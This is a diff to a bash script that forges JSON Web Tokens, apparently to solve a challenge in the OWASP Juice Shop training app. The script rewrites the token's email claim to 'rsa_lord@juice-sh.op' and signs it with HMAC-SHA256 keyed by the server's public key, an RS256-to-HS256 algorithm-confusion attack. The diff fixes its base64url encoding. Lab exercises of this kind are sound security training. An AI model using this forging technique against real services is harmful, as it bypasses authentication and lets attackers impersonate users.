@@ -7,8 +7,8 @@ decode_jwt() {
     IFS='.' read -r -a parts <<< "$1"
 
     # Remove newline characters and decode URL encoding from each part
-    header=$(echo "${parts[0]}" | tr -d '\n' | sed 's/%3D/=/g; s/%2B/+/g; s/%2F/\//g')
-    payload=$(echo "${parts[1]}" | tr -d '\n' | sed 's/%3D/=/g; s/%2B/+/g; s/%2F/\//g')
+    header=$(echo "${parts[0]}" | tr -d '\n')
+    payload=$(echo "${parts[1]}" | tr -d '\n')
     signature=$(echo "${parts[2]}" | tr -d '\n')
 
     # Decode Base64 for header and payload
@@ -36,14 +36,15 @@ modify_and_sign_jwt() {
     modified_payload=$(echo "$2" | sed 's/"email":"[^"]*"/"email":"rsa_lord@juice-sh.op"/')
 
     # Encode Base64 for modified header and payload
-    encoded_modified_header=$(echo -n "$modified_header" | base64 | tr -d '\n')
-    encoded_modified_payload=$(echo -n "$modified_payload" | base64 | tr -d '\n')
+    encoded_modified_header=$(echo -n "$modified_header" | base64 | tr -d '\n' | sed 's/+/-/g; s/\//_/g; s/=//g')
+    
+    encoded_modified_payload=$(echo -n "$modified_payload" | base64 | tr -d '\n' | sed 's/+/-/g; s/\//_/g; s/=//g')
 
     # Concatenate the encoded modified header and payload with a '.'
     header_payload_concat="${encoded_modified_header}.${encoded_modified_payload}"
 
     # Sign the concatenated header and payload using HMAC-SHA256 with the public key
-    local signature=$(echo -n "$header_payload_concat" | openssl dgst -sha256 -mac HMAC -macopt hexkey:"$public_key_hex" -binary | base64 | tr -d '\n')
+    local signature=$(echo -n "$header_payload_concat" | openssl dgst -sha256 -mac HMAC -macopt hexkey:"$public_key_hex" -binary)
 
     # Print out the signature
     echo -e "\nModified and Signed JWT Signature:"
